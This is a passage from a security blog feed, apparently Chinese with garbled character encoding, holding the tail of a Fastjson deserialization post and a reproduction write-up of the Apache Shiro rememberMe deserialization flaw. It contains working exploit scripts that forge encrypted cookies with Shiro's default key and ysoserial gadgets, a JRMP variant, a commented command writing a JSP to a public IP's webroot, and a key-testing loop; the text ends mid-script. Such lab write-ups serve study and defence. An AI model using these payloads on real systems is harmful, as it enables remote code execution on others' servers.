sAAAAGAAEAAAAUAAwAAAAqAAQAAAABAA0ADgAAAAAAAQATABQAAQAAAAEAGQAaAAIAAAABABsAHAADAA8AAAAEAAEAFwAJAB0AHgACAAoAAABBAAIAAgAAAAm7AAVZtwAGTLEAAAACAAsAAAAKAAIAAAAXAAgAGAAMAAAAFgACAAAACQAfACAAAAAIAAEAIQAOAAEADwAAAAQAAQAiAAEAIwAAAAIAJA&#x3D;&#x3D;&quot;],&#39;_name&#39;:&#39;a.b&#39;,&#39;_tfactory&#39;:&#123; &#125;,&quot;_outputProperties&quot;:&#123; &#125;,&quot;_name&quot;:&quot;a&quot;,&quot;_version&quot;:&quot;1.0&quot;,&quot;allowedProtocols&quot;:&quot;all&quot;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="note"><a href="#note" class="headerlink" title="note"></a>note</h3><p>lexerçš„npä»£è¡¨å¼€å§‹ä½ç½®çš„åç§»é‡ï¼Œbpè¡¨ç¤ºç»“æŸä½ç½®çš„åç§»é‡ï¼Œæ¯nextä¸€æ¬¡bpå°±åŠ ä¸€ï¼Œspæ˜¯ç›¸è¾ƒäºnpè€Œè¨€çš„åç§»é‡ã€‚</p>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/">fastjson è¿œç¨‹ååºåˆ—åŒ–pocçš„æ„é€ å’Œåˆ†æ</a><br><a href="http://www.lmxspace.com/2019/06/29/FastJson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/">FastJson ååºåˆ—åŒ–å­¦ä¹ </a><br><a href="https://paper.seebug.org/994/">Fastjson æµç¨‹åˆ†æåŠ RCE åˆ†æ</a><br><a href="https://meizjm3i.github.io/2019/06/05/FastJsonååºåˆ—åŒ–è§£ææµç¨‹/">FastJsonååºåˆ—åŒ–è§£ææµç¨‹</a><br><a href="https://www.kingkk.com/2019/07/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1-2-24-1-2-48/">Fastjsonååºåˆ—åŒ–æ¼æ´ 1.2.24-1.2.48</a><br><a href="https://blog.csdn.net/hanchao5272/article/details/79401434">Javaä¸­Typeæ¥å£ä¸Classç±»çš„åŒºåˆ«è”ç³»</a><br><a href="https://www.cnblogs.com/baiqiantao/p/7460580.html">Type æ¥å£ã€é‡è¦ã€‘</a><br><a href="https://blog.csdn.net/shangzonghai/article/details/79573698">ç§’æ‡‚ Javaæ³¨è§£ç±»å‹ï¼ˆ@Annotationï¼‰</a><br><a href="https://blog.csdn.net/shangzonghai?t=1">fastjsonæ·±åº¦æºç è§£æ</a></p>
]]></content>
      <categories>
        <category>web security</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>shiro ååºåˆ—åŒ–å¤ç°</title>
    <url>/2019/09/20/shiro%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<!-- åªè¦rememberMeçš„AESåŠ å¯†å¯†é’¥æ³„éœ²ï¼Œæ— è®ºshiroæ˜¯ä»€ä¹ˆç‰ˆæœ¬éƒ½ä¼šæœ‰RCEé£é™©ã€‚ -->
<!-- more -->

<h2 id="åˆ©ç”¨ç¯å¢ƒæ­å»º"><a href="#åˆ©ç”¨ç¯å¢ƒæ­å»º" class="headerlink" title="åˆ©ç”¨ç¯å¢ƒæ­å»º"></a>åˆ©ç”¨ç¯å¢ƒæ­å»º</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker pull medicean/vulapps:s_shiro_1</span><br><span class="line">docker run -d -p 80:8080 medicean/vulapps:s_shiro_1</span><br></pre></td></tr></table></figure>

<h2 id="æ¼æ´åˆ©ç”¨æ¡ä»¶"><a href="#æ¼æ´åˆ©ç”¨æ¡ä»¶" class="headerlink" title="æ¼æ´åˆ©ç”¨æ¡ä»¶"></a>æ¼æ´åˆ©ç”¨æ¡ä»¶</h2><p>åªè¦rememberMeçš„AESåŠ å¯†å¯†é’¥æ³„éœ²ï¼Œæ— è®ºshiroæ˜¯ä»€ä¹ˆç‰ˆæœ¬éƒ½ä¼šå¯¼è‡´ååºåˆ—åŒ–æ¼æ´ã€‚</p>
<h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">JAR_FILE = <span class="string">'/Users/Viarus/Downloads/ysoserial/target/ysoserial-0.0.6-SNAPSHOT-all.jar'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span><span class="params">(url, rce_command)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'://'</span> <span class="keyword">not</span> <span class="keyword">in</span> url:</span><br><span class="line">        target = <span class="string">'https://%s'</span> % url <span class="keyword">if</span> <span class="string">':443'</span> <span class="keyword">in</span> url <span class="keyword">else</span> <span class="string">'http://%s'</span> % url</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        target = url</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        payload = generator(rce_command, JAR_FILE)  <span class="comment"># ç”Ÿæˆpayload</span></span><br><span class="line">        r = requests.get(target, cookies=&#123;<span class="string">'rememberMe'</span>: payload.decode()&#125;, timeout=<span class="number">10</span>)  <span class="comment"># å‘é€éªŒè¯è¯·æ±‚</span></span><br><span class="line">        <span class="keyword">print</span> r.text</span><br><span class="line">    <span class="keyword">except</span> Exception, e:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generator</span><span class="params">(command, fp)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(fp):</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">'jar file not found!'</span>)</span><br><span class="line">    popen = subprocess.Popen([<span class="string">'java'</span>, <span class="string">'-jar'</span>, fp, <span class="string">'CommonsCollections2'</span>, command],</span><br><span class="line">                             stdout=subprocess.PIPE)</span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class="line">    key = <span class="string">"kPH+bIxk5D2deZiIxcaaaA=="</span></span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line">    iv = uuid.uuid4().bytes</span><br><span class="line">    encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">    file_body = pad(popen.stdout.read())</span><br><span class="line">    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    <span class="keyword">return</span> base64_ciphertext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">	<span class="comment">#http://www.jackson-t.ca/runtime-exec-payloads.html</span></span><br><span class="line">    poc(<span class="string">'http://127.0.0.1:8080'</span>, <span class="string">'open /Applications/Calculator.app'</span>)</span><br></pre></td></tr></table></figure>

<h2 id="åŠ¨æ€åˆ†æç¯å¢ƒæ­å»º"><a href="#åŠ¨æ€åˆ†æç¯å¢ƒæ­å»º" class="headerlink" title="åŠ¨æ€åˆ†æç¯å¢ƒæ­å»º"></a>åŠ¨æ€åˆ†æç¯å¢ƒæ­å»º</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;apache&#x2F;shiro.git</span><br><span class="line">git checkout shiro-root-1.2.4</span><br><span class="line">cd .&#x2F;shiro&#x2F;samples&#x2F;web</span><br></pre></td></tr></table></figure>

<p>mac å®‰è£…jdk6 <a href="https://juejin.im/post/5d550c5d51882504fb3022f7">https://juejin.im/post/5d550c5d51882504fb3022f7</a><br>ä¸ºäº†èƒ½åŠ¨æ€è°ƒè¯•éœ€è¦åœ¨<code>shiro/samples/web</code>ä¸­æ·»åŠ </p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--  éœ€è¦è®¾ç½®ç¼–è¯‘çš„ç‰ˆæœ¬ --&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jstl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">           <span class="comment">&lt;!--  è¿™é‡Œéœ€è¦å°†jstlè®¾ç½®ä¸º1.2 --&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span> </span><br><span class="line">           <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">       <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections4<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="./1568432319724.png" alt="Alt text"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;toolchains xmlns&#x3D;&quot;http:&#x2F;&#x2F;maven.apache.org&#x2F;TOOLCHAINS&#x2F;1.1.0&quot; xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot;</span><br><span class="line">  xsi:schemaLocation&#x3D;&quot;http:&#x2F;&#x2F;maven.apache.org&#x2F;TOOLCHAINS&#x2F;1.1.0 http:&#x2F;&#x2F;maven.apache.org&#x2F;xsd&#x2F;toolchains-1.1.0.xsd&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--æ’å…¥ä¸‹é¢ä»£ç --&gt;</span><br><span class="line">  &lt;toolchain&gt;</span><br><span class="line">    &lt;type&gt;jdk&lt;&#x2F;type&gt;</span><br><span class="line">    &lt;provides&gt;</span><br><span class="line">      &lt;version&gt;1.6&lt;&#x2F;version&gt;</span><br><span class="line">      &lt;vendor&gt;sun&lt;&#x2F;vendor&gt;</span><br><span class="line">    &lt;&#x2F;provides&gt;</span><br><span class="line">    &lt;configuration&gt;</span><br><span class="line">        &lt;!--è¿™é‡Œæ˜¯ä½ å®‰è£…jdkçš„æ–‡ä»¶ç›®å½•--&gt;</span><br><span class="line">      &lt;jdkHome&gt;&#x2F;Library&#x2F;Java&#x2F;JavaVirtualMachines&#x2F;1.6.0.jdk&#x2F;&lt;&#x2F;jdkHome&gt;</span><br><span class="line">    &lt;&#x2F;configuration&gt;</span><br><span class="line">  &lt;&#x2F;toolchain&gt;</span><br><span class="line">&lt;&#x2F;toolchains&gt;</span><br></pre></td></tr></table></figure>
<p><img src="./1568433547267.png" alt="Alt text"></p>
<ol>
<li>Run</li>
<li>Edit Configurations </li>
<li>æ·»åŠ TomcatServer(Local) </li>
<li>Serverä¸­é…ç½®Tomcatè·¯å¾„ </li>
<li>Deploymentä¸­æ·»åŠ Artifact</li>
<li>é€‰æ‹©sample-web:war exploded</li>
</ol>
<p><img src="./1568434183366.png" alt="Alt text"><br><img src="./1568434273648.png" alt="Alt text"><br><img src="./1568434542261.png" alt="Alt text"></p>
<h2 id="ä»£ç åˆ†æ"><a href="#ä»£ç åˆ†æ" class="headerlink" title="ä»£ç åˆ†æ"></a>ä»£ç åˆ†æ</h2><p>æ ¹æ®<a href="https://issues.apache.org/jira/browse/SHIRO-550">å®˜ç½‘çš„å™è¿°</a>æ¯”è¾ƒæ¸…æ¥šäº†<br><img src="./1568443220292.png" alt="Alt text"></p>
<h3 id="åŠ å¯†"><a href="#åŠ å¯†" class="headerlink" title="åŠ å¯†"></a>åŠ å¯†</h3><p>convertPrincipalsToBytes<br><img src="./1568444817925.png" alt="Alt text"></p>
<p>åºåˆ—åŒ–å…·ä½“<br><img src="./1568444950433.png" alt="Alt text"></p>
<p>åŠ å¯†å…·ä½“<br><img src="./1568445232222.png" alt="Alt text"></p>
<p>åŠ å¯†ç”¨åˆ°encryptionCipherKeyåœ¨æ„é€ æ–¹æ³•ä¸­ç¡®å®šï¼Œå…¶å®å°±æ˜¯DEFAULT_CIPHER_KEY_BYTES<br><img src="./1568445611986.png" alt="Alt text"><br><img src="./1568445398785.png" alt="Alt text"></p>
<p>åŠ å¯†ç”¨åˆ°çš„cipherServiceåœ¨å¯¹è±¡åˆå§‹åŒ–çš„æ—¶å€™ç¡®å®šä¸ºAesåŠ å¯†<br><img src="./1568445712016.png" alt="Alt text"><br><img src="./1568446509804.png" alt="Alt text"></p>
<p>è°ƒç”¨æ ˆ<br><img src="./1568448908855.png" alt="Alt text"></p>
<h3 id="è§£å¯†"><a href="#è§£å¯†" class="headerlink" title="è§£å¯†"></a>è§£å¯†</h3><p>getRememberedPrincipals<br><img src="./1568448343266.png" alt="Alt text"></p>
<p>ååºåˆ—åŒ–çš„èµ·ç‚¹<br><img src="./1568449252836.png" alt="Alt text"></p>
<p>è°ƒç”¨æ ˆ<br><img src="./1568449190079.png" alt="Alt text"></p>
<h2 id="æ¼æ´çš„åŸç”Ÿåˆ©ç”¨"><a href="#æ¼æ´çš„åŸç”Ÿåˆ©ç”¨" class="headerlink" title="æ¼æ´çš„åŸç”Ÿåˆ©ç”¨"></a>æ¼æ´çš„åŸç”Ÿåˆ©ç”¨</h2><p>shiroè‡ªå¸¦çš„åŒ…æ˜¯commons-collections3.2.1<br><img src="./1568450997092.png" alt="Alt text"></p>
<p>å…¶å®åŸç”Ÿæƒ…å†µä¸‹ç›´æ¥ç”¨ysoserialæ‰“ä¼šå‡ºç°æŠ¥é”™<br><img src="./1568467325645.png" alt="Alt text"><br><img src="./1568467351639.png" alt="Alt text"></p>
<p>æŠ¥é”™çš„åŸå› æ˜¯<br><img src="./1568454878837.png" alt="Alt text"><br><img src="./1568643856640.png" alt="Alt text"></p>
<p>æœ€å¼€å§‹çš„å¯ä»¥æ‰“æˆåŠŸçš„åŸå› æ˜¯ï¼Œä¸ºäº†æ–¹ä¾¿è¿›è¡Œå¤ç°ï¼Œæ­å»ºç¯å¢ƒæ—¶æ‰‹åŠ¨æ·»åŠ äº†ysoserialæ”¯æŒçš„commons-collections4ï¼Œæ‰€ä»¥å¤ç°èµ·æ¥æ‰å’Œå–æ°´ä¸€æ ·ç®€å•ï¼ˆæ©˜å­å¸ˆå‚…åŸè¯ï¼‰<br><img src="./1568479508256.png" alt="Alt text"></p>
<p>è§£å†³è¿™ç§é—®é¢˜çš„åŠæ³•æ˜¯ä½¿ç”¨JRMPï¼Œè‡³äºåŸå› åº”è¯¥æ˜¯<br><img src="./1568454945784.png" alt="Alt text"><br><img src="./1568551239961.png" alt="Alt text"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 4444 CommonsCollections5 &#39;touch &#x2F;tmp&#x2F;hack_shiro_jrmp&#39;</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">JAR_FILE = <span class="string">'/Users/cengsiqi/Desktop/pentest/ysoserial-0.0.6-SNAPSHOT-all.jar'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span><span class="params">(url, JRMPServerIp)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'://'</span> <span class="keyword">not</span> <span class="keyword">in</span> url:</span><br><span class="line">        target = <span class="string">'https://%s'</span> % url <span class="keyword">if</span> <span class="string">':443'</span> <span class="keyword">in</span> url <span class="keyword">else</span> <span class="string">'http://%s'</span> % url</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        target = url</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        payload = generator(JRMPServerIp, JAR_FILE)  <span class="comment"># ç”Ÿæˆpayload</span></span><br><span class="line">        r = requests.get(target, cookies=&#123;<span class="string">'rememberMe'</span>: payload.decode()&#125;, timeout=<span class="number">10</span>)  <span class="comment"># å‘é€éªŒè¯è¯·æ±‚</span></span><br><span class="line">        <span class="keyword">print</span> r.text</span><br><span class="line">    <span class="keyword">except</span> Exception, e:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generator</span><span class="params">(JRMPServerIp, fp)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(fp):</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">'jar file not found!'</span>)</span><br><span class="line">    <span class="comment">#java -jar ysoserial-master-SNAPSHOT.jar JRMPClient '1.2.3.4:12345'</span></span><br><span class="line">    popen = subprocess.Popen([<span class="string">'java'</span>, <span class="string">'-jar'</span>, fp, <span class="string">'JRMPClient'</span>, JRMPServerIp],</span><br><span class="line">                             stdout=subprocess.PIPE)</span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class="line">    key = <span class="string">"kPH+bIxk5D2deZiIxcaaaA=="</span></span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line">    iv = uuid.uuid4().bytes</span><br><span class="line">    encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">    file_body = pad(popen.stdout.read())</span><br><span class="line">    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    <span class="keyword">return</span> base64_ciphertext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment">#http://www.jackson-t.ca/runtime-exec-payloads.html</span></span><br><span class="line">    <span class="comment">#poc('http://47.106.182.92:8080/', 'bash -c &#123;echo,ZWNobyBgd2hvYW1pYCA+IC91c3IvbG9jYWwvdG9tY2F0L3dlYmFwcHMvUk9PVC9oYWNrLmpzcA==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;')</span></span><br><span class="line">    poc(<span class="string">'http://127.0.0.1:8888/samples_web_war_exploded/'</span>, <span class="string">'127.0.0.1:12345'</span>)</span><br></pre></td></tr></table></figure>

<p>ç„¶è€Œæœ¬åœ°æµ‹è¯•çš„æ—¶å€™å¹¶æœªå¤ç°ä¸­ï¼Œåº”è¯¥æ˜¯gadgetçš„é—®é¢˜ï¼Œå› ä¸ºåœ¨åŠ äº†commons-conllections4.0çš„ç¯å¢ƒç”¨ysoserialçš„CommonsCollections2å°±å¯ä»¥æˆåŠŸã€‚éš¾é“æ˜¯ç¯å¢ƒæ²¡è£…å¥½ï¼Ÿ</p>
<p><strong>åæ¥ä»”ç»†çœ‹äº†ä¸€ä¸‹ï¼Œç¡®å®æ˜¯ç¯å¢ƒçš„é—®é¢˜ï¼Œå…·ä½“åŸå› æ˜¯æ‰“åŒ…æˆwarçš„æ—¶å€™åªä¼šæŠŠcompileå’Œruntimeçš„æ‰“åŒ…ï¼Œè€Œtestçš„å±äºå¼€å‘é˜¶æ®µéœ€è¦ä½¿ç”¨çš„ï¼Œä»è€Œä¸ä¼šæ‰“è¿›å»ï¼Œè€Œè¿™é‡Œcommon-conllectonsæ°å¥½å±äºtestã€‚æ‰€ä»¥ç”Ÿæˆç¯å¢ƒä¸­æ ¹æœ¬æ²¡æœ‰common-conllectonsï¼Œå› æ­¤æ˜¯ä¸å¯èƒ½æ‰“æˆåŠŸçš„</strong>ã€‚<br><img src="./1568551376077.png" alt="Alt text"><br><img src="./1568796705290.png" alt="Alt text"></p>
<p>æ­¤å¤–æ³¨æ„åˆ°åŸç”Ÿshiroï¼Œè¿˜è‡ªå¸¦CommonsBeanutils1.8.3ï¼Œè€ŒCommonsBeanutilså†å²ä¸Šæ˜¯æœ‰gadgetã€‚<br><img src="./1568646188492.png" alt="Alt text"><br><img src="./1568646208505.png" alt="Alt text"></p>
<p>æ”¹äº†ysoserialçš„pom CommonsBeanutilsæˆ1.8.3åˆçˆ†äº†æ–°çš„é”™è¯¯</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Caused by: org.apache.shiro.util.UnknownClassException: Unable to load class named [org.apache.commons.collections.comparators.ComparableComparator] from the thread context, current, or system&#x2F;application ClassLoaders.  All heuristics have been exhausted.  Class could not be found.</span><br><span class="line">	at org.apache.shiro.util.ClassUtils.forName(ClassUtils.java:148)</span><br><span class="line">	at org.apache.shiro.io.ClassResolvingObjectInputStream.resolveClass(ClassResolvingObjectInputStream.java:53)</span><br><span class="line">	... 51 more</span><br></pre></td></tr></table></figure>


<p><strong>æ‰€ä»¥ç«‹ä¸ªflagï¼šçº¯åŸç”Ÿçš„shiroåªæ˜¯ä¸€ä¸ªååºåˆ—åŒ–çš„è§¦å‘ç‚¹ï¼Œæ²¡æœ‰å®Œæ•´gadgetã€‚å› æ­¤éœ€è¦ç»“åˆå…¶å®ƒä¾èµ–shiroçš„é¡¹ç›®æ‰æœ‰å¯èƒ½è¾¾åˆ°RCEçš„æ•ˆæœï¼ˆæ¯”å¦‚jeecmsï¼‰</strong></p>
<h2 id="å…¶ä»–"><a href="#å…¶ä»–" class="headerlink" title="å…¶ä»–"></a>å…¶ä»–</h2><h3 id="è§£å¯†è„šæœ¬"><a href="#è§£å¯†è„šæœ¬" class="headerlink" title="è§£å¯†è„šæœ¬"></a>è§£å¯†è„šæœ¬</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># pip install pycrypto</span><br><span class="line">import sys</span><br><span class="line">import base64</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line">def decode_rememberme(cookie):</span><br><span class="line">    key  &#x3D;  &quot;kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;&quot;</span><br><span class="line">    mode &#x3D;  AES.MODE_CBC</span><br><span class="line">    cipher &#x3D; base64.b64decode(cookie)</span><br><span class="line">    IV   &#x3D; cipher[0:16]</span><br><span class="line">    encryptor &#x3D; AES.new(base64.b64decode(key), mode, IV&#x3D;IV)</span><br><span class="line">    remember_bin &#x3D; encryptor.decrypt(cipher[16:])</span><br><span class="line">    return remember_bin</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    cookie&#x3D;&quot;&quot;&quot;&quot;&quot;&quot;</span><br><span class="line">    print(decode_rememberme(cookie)[16:])</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python decrypt.py cGhyYWNrY3RmREUhfiMkZA&#x3D;&#x3D; | xxd</span><br></pre></td></tr></table></figure>

<h3 id="DNS-gadgetéªŒè¯æ¼æ´"><a href="#DNS-gadgetéªŒè¯æ¼æ´" class="headerlink" title="DNS gadgetéªŒè¯æ¼æ´"></a>DNS gadgetéªŒè¯æ¼æ´</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial-master-SNAPSHOT.jar URLDNS http:&#x2F;&#x2F;yoursite</span><br></pre></td></tr></table></figure>

<h3 id="è·å–å…¨ç‰ˆæœ¬è§£å†³SUIDé—®é¢˜"><a href="#è·å–å…¨ç‰ˆæœ¬è§£å†³SUIDé—®é¢˜" class="headerlink" title="è·å–å…¨ç‰ˆæœ¬è§£å†³SUIDé—®é¢˜"></a>è·å–å…¨ç‰ˆæœ¬è§£å†³SUIDé—®é¢˜</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> Popen,PIPE</span><br><span class="line"><span class="keyword">from</span> xml.dom.minidom <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">repo_url = <span class="string">"http://uk.maven.org/maven2/commons-beanutils/commons-beanutils/maven-metadata.xml"</span></span><br><span class="line">mvn_home = <span class="string">"/Users/cengsiqi/.m2/repository"</span></span><br><span class="line">yso_path = <span class="string">"/Users/cengsiqi/Desktop/pentest/ysoserial/target/classes"</span></span><br><span class="line">gadget = <span class="string">"CommonsBeanutils1"</span></span><br><span class="line">command = <span class="string">'touch /tmp/hack_shiro_CommonsBeanutils1'</span></span><br><span class="line"><span class="comment">#key = "kPH+bIxk5D2deZiIxcaaaA=="</span></span><br><span class="line">key = <span class="string">"4AvVhmFLUs0KTA3Kprsdag=="</span></span><br><span class="line">target = <span class="string">"http://172.16.247.129:8080/"</span></span><br><span class="line">iv = uuid.uuid4().bytes</span><br><span class="line"></span><br><span class="line">res = requests.get(repo_url)</span><br><span class="line">html = res.content</span><br><span class="line">root = parseString(html.decode(<span class="string">"utf-8"</span>))</span><br><span class="line">groupId = root.getElementsByTagName(<span class="string">"groupId"</span>)[<span class="number">0</span>].firstChild.data</span><br><span class="line">artifactId = root.getElementsByTagName(<span class="string">"artifactId"</span>)[<span class="number">0</span>].firstChild.data</span><br><span class="line">print(groupId, artifactId)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span><span class="params">(payload)</span>:</span></span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line">    encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">    file_body = pad(payload)</span><br><span class="line">    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    <span class="keyword">return</span> base64_ciphertext</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> root.getElementsByTagName(<span class="string">"version"</span>):</span><br><span class="line">    version = i.firstChild.data</span><br><span class="line">    <span class="keyword">if</span> version.find(<span class="string">'-pre'</span>) &gt; <span class="number">-1</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    jar_path = mvn_home + <span class="string">'/'</span> + groupId.replace(<span class="string">'.'</span>, <span class="string">'/'</span>) + <span class="string">'/'</span> + artifactId + <span class="string">'/'</span> + version + <span class="string">'/'</span> + artifactId + <span class="string">'-'</span> + version + <span class="string">'.jar'</span></span><br><span class="line">    print(jar_path)</span><br><span class="line">    mvncmd = <span class="string">"mvn dependency:get -DremoteRepositories=http://repo1.maven.org/maven2/ -DgroupId=%s -DartifactId=%s -Dversion=%s"</span> \</span><br><span class="line">          % 